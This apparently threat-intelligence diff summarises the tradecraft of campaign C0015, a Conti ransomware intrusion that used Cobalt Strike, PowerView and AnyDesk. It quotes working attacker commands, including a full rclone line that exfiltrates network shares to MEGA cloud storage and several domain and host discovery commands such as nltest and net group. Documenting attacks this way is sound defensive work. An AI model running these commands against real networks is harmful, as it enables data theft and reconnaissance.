@@ -1,0 +1,28 @@
+During C0015, the threat actors used cmd.exe to execute commands and run malicious binaries. They also employed a malicious HTA file containing a mixture of HTML and JavaScript/VBScript code, with portions of the HTML being encoded.
+
+Moreover, they utilized Conti ransomware to encrypt the compromised network and collected files from network shared drives prior to encryption. The stolen files and data were then exfiltrated from the network.
+
+PowerView’s file share enumeration results were stored in c:\ProgramData\found_shares.txt. To further control the exfiltration process, the threat actors limited Rclone’s bandwidth setting.
+
+In addition, they used the command nltest /domain_trusts /all_trusts to enumerate domain trusts and exfiltrated sensitive data to the MEGA cloud storage site using the following Rclone command:
+rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M  
+
+They conducted file listing discovery across multiple hosts to ensure that the locker encryption was successful and downloaded additional tools and files onto the compromised network.
+
+For lateral movement, the attackers used WMI to load Cobalt Strike onto other hosts. One binary was named compareForfor.jpg to masquerade as a JPG file, and PowerView's ShareFinder module was executed to identify open shares. They also employed Base64-encoded strings throughout the operation.
+
+The actors leveraged both Cobalt Strike and Conti ransomware and obtained various tools, including AdFind, AnyDesk, and Process Hacker.
+
+To escalate privileges, they used the command net localgroup "administrator" to identify accounts with local administrator rights and net group "domain admins" /dom to enumerate domain groups.
+
+According to security researchers, the attack likely began with a phishing campaign that delivered a weaponized attachment to victims.
+
+They used the tasklist /s command and Task Manager to gather information on running processes. A DLL named D8B3.dll was injected into the Winlogon process, and the AnyDesk remote desktop application was installed on the compromised network.
+
+The threat actors accessed specific network hosts using RDP. For host discovery, they ran net view /all /domain and ping, and additionally used PowerView’s PowerShell Invoke-ShareFinder script for file share enumeration.
+
+They utilized DLL files with invalid certificates, executed DLLs via mshta, employed code that used regsvr32 for execution, and loaded DLLs via rundll32 using the svchost process.
+
+They also executed code to obtain the external public-facing IPv4 address of the compromised host and used the command net view /all time to gather the local time.
+
+To gain initial access or execute payloads, they relied on users enabling macros within malicious Microsoft Word documents. Furthermore, they used wmic and rundll32 to load Cobalt Strike onto a target host.
